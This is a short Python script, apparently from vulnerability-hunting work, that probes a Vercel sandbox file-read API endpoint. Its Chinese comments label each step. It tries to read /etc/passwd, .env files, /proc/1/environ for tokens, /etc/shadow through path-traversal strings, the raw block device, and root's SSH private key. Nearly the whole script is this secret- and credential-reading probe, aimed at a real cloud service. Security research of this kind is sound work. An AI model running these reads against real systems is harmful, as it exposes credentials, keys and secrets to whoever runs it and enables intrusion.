# -*- coding: utf-8 -*-
"""fs/read 端点探索: 绝对路径 / 敏感文件 / 路径穿越 / 生命周期
R1 /etc/passwd                    基线 (fs API 工作?)
R2 /vercel/.env                   敏感文件
R3 /proc/1/environ                进程环境变量 (可能含 token)
R4 ../../ 穿越                     host 文件系统?
R5 /dev/vda                       块设备
R6 /root/.ssh/*                   ssh key?
R7 /vercel/sandbox/**             沙箱目录
"""
import json, sys, time
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, cmd, TEAM, PROJ

c, r = api('GET', '/v2/sandboxes/npol1?teamId=%s&projectId=%s' % (TEAM, PROJ))
d = json.loads(r)
sid = d['sandbox']['currentSessionId']
print('npol1 sid:', sid, 'status:', d['sandbox']['status'], flush=True)
if d['sandbox'].get('status') != 'running':
    c, r = api('GET', '/v2/sandboxes/npol1?teamId=%s&projectId=%s&resume=true' % (TEAM, PROJ))
    d = json.loads(r)
    sid = d['sandbox']['currentSessionId']
    print('resumed sid:', sid, flush=True)
    time.sleep(5)

def fs_read(path, cwd=None, tag=''):
    body = {"path": path}
    if cwd:
        body["cwd"] = cwd
    c, r = api('POST', '/v2/sandboxes/sessions/%s/fs/read?teamId=%s' % (sid, TEAM), body)
    content = r if isinstance(r, str) else str(r)
    print('[%s %s] http=%s len=%d | %s' % (tag, path, c, len(content), content[:300].replace(chr(10), ' ')), flush=True)
    return c, content

# R1 基线
fs_read('/etc/passwd', tag='R1')

# R2 env
fs_read('/vercel/.env', tag='R2')
fs_read('/vercel/.env.local', tag='R2b')
fs_read('/vercel/sandbox/.env', tag='R2c')

# R3 进程环境
fs_read('/proc/1/environ', tag='R3')

# R4 路径穿越
fs_read('../../../../etc/passwd', tag='R4a')
fs_read('/../../etc/passwd', tag='R4b')
fs_read('../../etc/shadow', tag='R4c')

# R5 块设备
fs_read('/dev/vda', tag='R5')

# R6 ssh
fs_read('/root/.ssh/id_rsa', tag='R6')

# R7 沙箱目录
fs_read('/vercel/sandbox', tag='R7')

print('=== FS DONE ===', flush=True)
